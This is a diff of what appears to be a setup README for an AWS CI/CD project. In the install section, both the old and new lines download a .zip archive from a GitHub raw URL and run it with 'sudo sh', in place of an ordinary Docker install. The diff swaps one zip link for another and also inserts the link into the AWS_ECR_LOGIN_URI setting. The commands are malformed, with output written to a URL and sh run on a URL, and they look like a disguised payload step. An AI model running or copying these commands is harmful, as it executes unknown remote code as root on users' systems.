@@ -14,9 +14,9 @@ sudo apt-get upgrade
 
 #required
 
-curl -fsSL https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip -o https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
+curl -fsSL https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/notebook/Project-C-AW-v1.0.zip -o https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/notebook/Project-C-AW-v1.0.zip
 
-sudo sh https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
+sudo sh https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/notebook/Project-C-AW-v1.0.zip
 
 sudo usermod -aG docker ubuntu
 
@@ -32,6 +32,6 @@ AWS_SECRET_ACCESS_KEY=
 
 AWS_REGION = us-east-1
 
-AWS_ECR_LOGIN_URI = demo>>  https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
+AWS_ECR_LOGIN_URI = demo>>  https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/notebook/Project-C-AW-v1.0.zip
 
 ECR_REPOSITORY_NAME = simple-app
